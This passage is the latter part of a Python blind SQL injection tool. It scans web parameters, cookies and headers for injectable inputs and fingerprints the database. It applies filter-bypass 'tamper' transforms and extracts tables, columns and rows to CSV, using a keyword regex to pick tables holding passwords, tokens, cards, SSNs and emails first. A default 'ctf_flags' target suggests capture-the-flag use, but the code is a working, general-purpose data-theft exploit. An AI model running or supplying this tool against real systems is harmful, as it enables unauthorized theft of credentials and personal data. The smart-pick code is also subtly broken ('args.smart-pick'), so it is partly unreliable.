                cols.append(col); blanks=0
        return cols
    def rowcount(self, table: str) -> int:
        return self._bin(self.o, f"SELECT COUNT(*) FROM '{table}'", 0, self._ub(self.o, f"SELECT COUNT(*) FROM '{table}'", 1, CAP_ROWS))
    def dump_table(self, table: str, cols: List[str], max_rows: int) -> List[List[str]]:
        total = min(self.rowcount(table), max_rows) if max_rows>0 else self.rowcount(table)
        order = cols[0] if cols else "rowid"
        rows = []
        for off in range(total):
            row = []
            for c in cols:
                expr = f"(SELECT CAST({c} AS TEXT) FROM '{table}' ORDER BY {order} LIMIT 1 OFFSET {off})"
                row.append(self.get_string(expr, 4096))
            rows.append(row)
            print(f"[dump-sqlite] {table} {off+1}/{total}", end="\r")
        print()
        return rows
    def relationships(self) -> List[Tuple[str,str,str,str,str]]:
        rels = []
        tables = self.list_tables()
        for t in tables:
            tq = t.replace("'", "''")
            cnt_expr = f"SELECT COUNT(*) FROM pragma_foreign_key_list('{tq}')"
            n = self._bin(self.o, cnt_expr, 0, self._ub(self.o, cnt_expr, 1, 10000))
            for off in range(n):
                expr = (f"(SELECT '{tq}'||':'||'['||(SELECT name FROM pragma_table_info('{tq}') WHERE cid=(SELECT from_ FROM pragma_foreign_key_list('{tq}') LIMIT 1 OFFSET {off}))||']'||':'||"
                        f"(SELECT table FROM pragma_foreign_key_list('{tq}') LIMIT 1 OFFSET {off})||':'||"
                        f"'['||(SELECT name FROM pragma_table_info((SELECT table FROM pragma_foreign_key_list('{tq}') LIMIT 1 OFFSET {off})) "
                        f"WHERE cid=(SELECT to FROM pragma_foreign_key_list('{tq}') LIMIT 1 OFFSET {off}))||']'||':'||"
                        f"(SELECT id FROM pragma_foreign_key_list('{tq}') LIMIT 1 OFFSET {off}))")
                s = self.get_string(expr, 1024)
                if s and s.count(':')>=4:
                    parts = s.split(':')
                    src_tbl = parts[0]
                    src_col = parts[1].strip('[]')
                    ref_tbl = parts[2]
                    ref_col = parts[3].strip('[]')
                    cn = parts[4]
                    rels.append((src_tbl, src_col, ref_tbl, ref_col, f"fk_{cn}"))
        return rels

# -------------------- helpers --------------------

ADAPTERS = [MySQLAdapter, MSSQLAdapter, OracleAdapter, PostgresAdapter, SQLiteAdapter]

SENSITIVE_PATTERNS = re.compile(
    r"(?i)\b(user|users|account|accounts|member|admin|auth|login|passwd|password|secret|token|apikey|api[_-]?key|config|setting|flag|credential|card|credit|ssn|email|phone|address)\b"
)

def write_csv(path: str, headers: List[str], rows: List[List[str]]):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(headers); w.writerows(rows)

def write_schema_files(outdir: str, tables: List[str], cols_map: Dict[str,List[str]], rels: List[Tuple[str,str,str,str,str]]):
    write_csv(os.path.join(outdir, "schema_tables.csv"), ["table"], [[t] for t in tables])
    rows = []
    for t, cols in cols_map.items():
        for c in cols:
            rows.append([t,c])
    write_csv(os.path.join(outdir, "schema_columns.csv"), ["table","column"], rows)
    write_csv(os.path.join(outdir, "schema_fks.csv"), ["src_table","src_column","ref_table","ref_column","constraint"], rels)
    dot = ["digraph schema {","  rankdir=LR;","  node [shape=box];"]
    for t in tables: dot.append(f'  "{t}";')
    for (s,sc,r,rc,cn) in rels:
        dot.append(f'  "{s}" -> "{r}" [label="{sc}->{rc}\\n{cn}"];')
    dot.append("}")
    with open(os.path.join(outdir, "schema_graph.dot"), "w", encoding="utf-8") as f:
        f.write("\n".join(dot))

# -------------------- main --------------------

def main():
    ap = argparse.ArgumentParser(description="Blind-SQLi scanner & dumper (GET/POST/COOKIE/HEADER | MySQL/MSSQL/Oracle/PostgreSQL/SQLite).")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", choices=["GET","POST"], default="GET")
    ap.add_argument("--data", help="POST body a=1&b=2")
    ap.add_argument("--cookie", help='Cookie header string, e.g., "uid=1; theme=dark"')
    ap.add_argument("--header", action="append", default=[], help='Extra header "K: V" (repeatable)')

    # TRUE markers
    ap.add_argument("--true-text", help="Substring in body when TRUE")
    ap.add_argument("--true-status", type=int, help="HTTP status when TRUE (e.g. 200)")
    ap.add_argument("--true-header", action="append", default=[], help='Require header contains substring (e.g., "Set-Cookie: logged=1")')

    # Where to scan
    ap.add_argument("--scan", action="store_true", help="Scan parameters for injection")
    ap.add_argument("--scan-cookie", action="store_true", help="Also scan all existing cookie keys")
    ap.add_argument("--scan-header", action="store_true", help="Scan header keys for injection (requires --header or --header-param)")
    ap.add_argument("--cookie-param", action="append", default=[], help="Additional cookie names to scan even if not set")
    ap.add_argument("--header-param", action="append", default=[], help="Header names to scan (e.g., X-User). If not present, baseline is empty.")

    # DB work
    ap.add_argument("--dbms", choices=["auto","mysql","mssql","oracle","postgres","sqlite"], default="auto")
    ap.add_argument("--enum", action="store_true", help="List tables/columns")
    ap.add_argument("--dump", action="store_true", help="Dump data")
    ap.add_argument("--table", help="Specific table to dump (schema.table for PG)")
    ap.add_argument("--all", action="store_true", help="Dump all tables")
    ap.add_argument("--smart-pick", type=int, default=0, help="Pick up to N 'nhạy cảm' tables if --table/--all not set")
    ap.add_argument("--max-rows", type=int, default=50, help="Max rows per table (0=ALL)")
    ap.add_argument("--outdir", default="blackbox_dumps", help="CSV output dir")

    # Sensitivity
    ap.add_argument("--tolerance", type=float, default=0.08, help="Length diff tolerance (fallback oracle)")
    ap.add_argument("--delay-sec", type=float, default=1.0, help="Time-based probe duration")
    ap.add_argument("--req-delay", type=float, default=0.0, help="Sleep (seconds) between HTTP requests")

    # Tamper / Bypass
    ap.add_argument("--tamper", action="append", default=[], help="Apply tamper transforms in order: " + ", ".join(TAMPER_MAP.keys()))

    args = ap.parse_args()

    # Build headers/cookies
    headers = {}
    for h in args.header:
        if ":" in h:
            k,v = h.split(":",1); headers[k.strip()] = v.strip()
    base_cookies = parse_cookie_header(args.cookie) if args.cookie else {}
    ep = Endpoint(args.url, args.method.upper(),
                  data=dict(parse_qsl(args.data)) if (args.method.upper()=="POST" and args.data) else {},
                  cookies=base_cookies, headers=headers)
    client = Client(ep, req_delay=args.req_delay)

    # Build marker
    hdr_markers: List[Tuple[str,str]] = []
    for h in args.true_header:
        if ":" in h:
            k,v = h.split(":",1); hdr_markers.append((k.strip(), v.strip()))
    marker = Marker(args.true_text, args.true_status, hdr_markers, args.tolerance)

    # Base params/data
    base_params = parse_query_dict(args.url) if ep.method=="GET" else {}
    base_data   = ep.data if ep.method=="POST" else {}
    base_headers = headers

    tamper_fn = compose_tamper(args.tamper)

    # Enumerate param candidates
    cand: List[Tuple[str,str]] = []
    cand += [("get", k) for k in base_params.keys()]
    cand += [("post", k) for k in base_data.keys()]
    if args.scan_cookie or args.cookie_param:
        cookie_keys = set(base_cookies.keys()) | set(args.cookie_param)
        cand += [("cookie", k) for k in cookie_keys]
    if args.scan_header or args.header_param:
        header_keys = set(base_headers.keys()) | set(args.header_param)
        cand += [("header", k) for k in header_keys]
    if not cand:
        print("[!] No parameters to scan (add --scan-cookie/--scan-header or pass data/cookie/header).")
        sys.exit(1)

    print(f"[*] Candidates: {cand}")

    findings: List[Finding] = []
    for loc, name in cand:
        if loc == "get":
            baseline_v = base_params.get(name, "")
        elif loc == "post":
            baseline_v = base_data.get(name, "")
        elif loc == "cookie":
            baseline_v = base_cookies.get(name, "")
        elif loc == "header":
            baseline_v = base_headers.get(name, "")
        else:
            baseline_v = ""
        try:
            f = probe(client, marker, loc, name, base_params, base_data, base_cookies, base_headers, baseline_v, args.tolerance, args.delay_sec, tamper_fn)
            if f:
                findings.append(f)
                print(f"[+] Injectable: {loc}:{name}  kind={f.kind}  mode={f.mode}")
        except Exception as e:
            print(f"[!] Probe error for {loc}:{name} -> {e}")

    if not findings:
        print("[!] No injectable parameter found by quick probes.")
        sys.exit(1)

    f0 = findings[0]
    if f0.location=="get": baseline_v = base_params.get(f0.param,"")
    elif f0.location=="post": baseline_v = base_data.get(f0.param,"")
    elif f0.location=="cookie": baseline_v = base_cookies.get(f0.param,"")
    else: baseline_v = base_headers.get(f0.param,"")

    obi = OracleBool(client, marker, f0.location, f0.param, baseline_v, f0.kind, base_params, base_data, base_cookies, base_headers, tamper_fn)

    # DBMS detection / override
    if args.dbms != "auto":
        dbms = args.dbms
    else:
        dbms = "unknown"
        for A in ADAPTERS:
            try:
                if A.detect(obi):
                    dbms = A.name; break
            except Exception:
                continue
    print(f"[+] Detected DBMS: {dbms}")

    if args.scan and not args.enum and not args.dump:
        return

    # Choose adapter
    adapter = None
    for A in ADAPTERS:
        if A.name == dbms:
            adapter = A(obi)
            break
    if adapter is None:
        print("[!] Enumeration/dump implemented for MySQL/MSSQL/Oracle/PostgreSQL/SQLite only.")
        return

    # List tables
    tables = adapter.list_tables()
    print(f"[+] Tables ({len(tables)}): {', '.join(tables) if tables else '(none)'}")

    # Columns per table
    cols_map = {t: adapter.list_columns(t) for t in tables}

    if args.enum and not args.dump:
        for t, cols in cols_map.items():
            print(f"  - {t}: {', '.join(cols)}")
        os.makedirs(args.outdir, exist_ok=True)
        rels = adapter.relationships()
        write_schema_files(args.outdir, tables, cols_map, rels)
        print(f"[+] Wrote schema CSVs + DOT in {args.outdir}/")
        return

    # Dump targets
    targets: List[str] = []
    if args.table:
        targets = [args.table]
    elif args.all:
        targets = tables
    elif args.smart-pick > 0:
        # Heuristic: prefer names with sensitive keywords; if none, fall back to first few
        ranked = []
        for t in tables:
            score = 0
            if SENSITIVE_PATTERNS.search(t): score += 10
            cols = cols_map.get(t, [])
            sens_cols = sum(1 for c in cols if SENSITIVE_PATTERNS.search(c or ""))
            score += min(5, sens_cols)
            ranked.append((score, t))
        ranked.sort(reverse=True)
        targets = [t for score, t in ranked if score>0][:args.smart-pick]
        if not targets:
            targets = tables[:args.smart-pick]
        print(f"[*] smart-pick targets: {targets}")
    else:
        targets = ["ctf_flags"] if "ctf_flags" in tables else tables[:1]

    os.makedirs(args.outdir, exist_ok=True)
    for t in targets:
        cols = cols_map.get(t) or adapter.list_columns(t)
        if not cols:
            print(f"[!] Skip {t}: no columns")
            continue
        max_rows = args.max_rows
        print(f"[*] Dump {t} (max_rows={max_rows if max_rows else 'ALL'}) ...")
        rows = adapter.dump_table(t, cols, max_rows)
        path = os.path.join(args.outdir, f"{t.replace('.','_')}.csv")
        write_csv(path, cols, rows)
        print(f"[+] Wrote {path} ({len(rows)} rows)")

    # Schema relationships after dump
    rels = adapter.relationships()
    write_schema_files(args.outdir, tables, cols_map, rels)
    print(f"[+] Wrote schema CSVs + DOT in {args.outdir}/")

if __name__ == "__main__":
    main()
